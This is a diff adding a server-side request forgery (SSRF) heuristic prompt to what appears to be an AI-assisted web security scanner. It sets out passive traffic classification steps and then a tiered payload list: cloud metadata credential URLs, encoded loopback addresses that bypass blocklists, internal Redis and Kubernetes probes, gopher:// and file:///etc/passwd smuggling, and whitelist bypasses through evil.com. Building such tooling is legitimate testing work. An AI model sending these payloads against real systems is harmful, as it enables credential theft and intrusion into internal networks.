@@ -169,4 +169,148 @@ Raw HTML tags in your output will break the Markdown renderer. Always use backti
     Test: `` `+alert(document.domain)+` ``
 """.strip(),
     },
+    "SSRF": {
+        "trigger_keywords": [
+            "url", "uri", "src", "dest", "destination", "redirect", "redirect_url",
+            "next", "target", "path", "host", "site", "page", "ref", "return",
+            "return_url", "callback", "webhook", "endpoint", "fetch", "load",
+            "open", "file", "proxy", "request", "api_url", "image_url", "link",
+        ],
+        "heuristic": """
+VULNERABILITY: Server-Side Request Forgery (SSRF)
+SOURCE: PortSwigger Web Security Academy + Red Team Expertise
+
+YOUR TASK — PASSIVE TRAFFIC ANALYSIS ONLY:
+You are analyzing a captured HTTP request/response pair for SSRF indicators.
+Reason through the following steps methodically. Do NOT apply XSS logic here.
+
+─────────────────────────────────────────────
+STEP 1 — CONTEXT ANALYSIS: IS THE SERVER FETCHING THIS VALUE?
+─────────────────────────────────────────────
+Examine every parameter in the request. Ask: could the server be using this
+value to make an outbound HTTP/network request on the user's behalf?
+
+HIGH-CONFIDENCE SSRF SURFACE — any of these is strong evidence:
+  • A parameter whose name is: url, uri, dest, redirect, src, path, host,
+    endpoint, webhook, callback, fetch, proxy, image_url, api_url, link, open
+  • A parameter whose VALUE looks like a full URL (https://...) or hostname
+  • A parameter whose value looks like an IP address or internal hostname
+  • The request goes to endpoints named: /fetch, /proxy, /load, /preview,
+    /screenshot, /export, /convert, /share, /subscribe, /notify, /webhook
+
+LOWER-CONFIDENCE SURFACE — warrants investigation:
+  • A `Referer` header that the application may log and follow
+  • XML request bodies (XXE-adjacent) with embedded URLs
+  • File upload endpoints that accept remote URLs instead of file data
+
+If NO plausible server-fetch surface exists → DO NOT REPORT. Exit.
+
+─────────────────────────────────────────────
+STEP 2 — VERIFICATION GATES: WHAT DID THE RESPONSE REVEAL?
+─────────────────────────────────────────────
+Examine the HTTP response carefully. Each gate maps to a classification:
+
+GATE A — Response contains internal data (🔴 VERIFIED HIGH):
+  The response body contains content that could only originate from an internal
+  system: AWS/GCP/Azure metadata, internal HTML, private API responses, file
+  system paths, or error messages naming internal hostnames/IPs.
+  Examples:
+    • `"instanceId"`, `"ami-id"` → AWS EC2 metadata leak
+    • `<title>Internal Dashboard</title>` → internal service reached
+    • `root:x:0:0` in response body → /etc/passwd read via file:// SSRF
+  → 🔴 VERIFIED HIGH. Quote the exact leaked content as evidence.
+
+GATE B — Response contains an error revealing a fetch attempt (🟡 LEAD):
+  The server returned an error that implies it tried to make the request:
+    • "Connection refused" / "ECONNREFUSED"
+    • "No route to host" / "Network is unreachable"
+    • "Invalid URL" containing the value you submitted
+    • DNS resolution errors naming the host you submitted
+  This is blind SSRF: the server attempted the fetch but returned an error.
+  → 🟡 INVESTIGATION LEAD. The parameter is almost certainly SSRF-vulnerable.
+
+GATE C — Response timing anomaly (🟡 LEAD):
+  Requests to internal IPs that exist respond instantly.
+  Requests to IPs that do NOT exist time out (1–30 seconds).
+  If you see dramatically different response times per value → timing oracle.
+  → 🟡 INVESTIGATION LEAD. Note the endpoint for out-of-band testing.
+
+GATE D — No observable difference in response (🟡 BLIND SSRF LEAD):
+  The parameter looks like an SSRF surface but the response gives no signal.
+  This is classic Blind SSRF. Cannot be verified passively.
+  → 🟡 INVESTIGATION LEAD. Requires out-of-band testing (Burp Collaborator).
+
+─────────────────────────────────────────────
+STEP 3 — CLASSIFICATION RULES
+─────────────────────────────────────────────
+VERIFIED HIGH — ALL must be true:
+  ✓ A parameter or header plausibly triggers a server-side fetch.
+  ✓ The response contains data that could ONLY come from an internal/external
+    system reached by the server (not from user-supplied input reflected back).
+
+INVESTIGATION LEAD — ANY is true:
+  • Parameter name/value pattern strongly implies a server-fetch surface, but
+    the response gives no confirmatory data (blind SSRF scenario).
+  • Response contains an error message revealing a network fetch was attempted.
+  • Response time varies in a way consistent with port-scanning behavior.
+
+DO NOT REPORT — if ANY is true:
+  • The "url" parameter is clearly a client-side redirect (Location header only).
+  • The value is reflected back in HTML with no sign of a server fetch.
+  • No parameter has any plausible server-fetch semantics.
+
+─────────────────────────────────────────────
+STEP 4 — ACTION PLAN: ADVANCED SSRF PAYLOADS
+─────────────────────────────────────────────
+For each lead or verified finding, provide these context-matched payloads.
+All payloads MUST be formatted as Markdown inline code blocks (backticks).
+
+TIER 1 — Cloud Metadata Endpoints (highest-impact, try first):
+  AWS EC2 Instance Metadata Service (IMDSv1):
+    `http://169.254.169.254/latest/meta-data/`
+    `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
+  AWS IMDSv2 (token-gated, but worth trying IMDSv1 first):
+    `http://169.254.169.254/latest/api/token`
+  GCP Metadata:
+    `http://metadata.google.internal/computeMetadata/v1/` (requires header: `Metadata-Flavor: Google`)
+  Azure IMDS:
+    `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
+
+TIER 2 — Localhost / Loopback Variants (bypass naive blocklists):
+  Standard:    `http://127.0.0.1/`
+  Short form:  `http://127.1/`
+  IPv6:        `http://[::1]/`
+  Decimal:     `http://2130706433/`   (127.0.0.1 in decimal)
+  Octal:       `http://0177.0.0.1/`  (127.0.0.1 in octal)
+  Hex:         `http://0x7f000001/`  (127.0.0.1 in hex)
+  Mixed:       `http://127.0.0.1:80%09/` (tab-encoded port separator)
+
+TIER 3 — Internal Network Enumeration:
+  Common internal admin panels:
+    `http://192.168.0.1/`
+    `http://10.0.0.1/`
+    `http://172.16.0.1/`
+  Internal Kubernetes API server:
+    `http://10.96.0.1:443/api/v1/namespaces/`
+  Internal Elasticsearch:
+    `http://localhost:9200/_cat/indices`
+  Internal Redis:
+    `dict://localhost:6379/info`
+
+TIER 4 — Filter Bypass Techniques:
+  Whitelist bypass via credentials:  `http://trusted-host@evil.com/`
+  Whitelist bypass via fragment:     `http://evil.com#trusted-host`
+  Whitelist bypass via subdomain:    `http://trusted-host.evil.com/`
+  Open redirect chain:               Submit a whitelisted URL that 302-redirects to 169.254.169.254
+  Protocol smuggling:                `file:///etc/passwd`
+                                     `dict://localhost:6379/info`
+                                     `gopher://localhost:6379/_INFO%0D%0A`
+  Double URL-encoding:               `http://127%2E0%2E0%2E1/`
+
+TIER 5 — Blind SSRF Detection (out-of-band):
+  Replace target with your Burp Collaborator or interactsh domain:
+    `http://YOUR-COLLABORATOR-SUBDOMAIN/ssrf-test`
+  If the server makes a DNS lookup or HTTP callback → confirmed blind SSRF.
+""".strip(),
+    },
 }
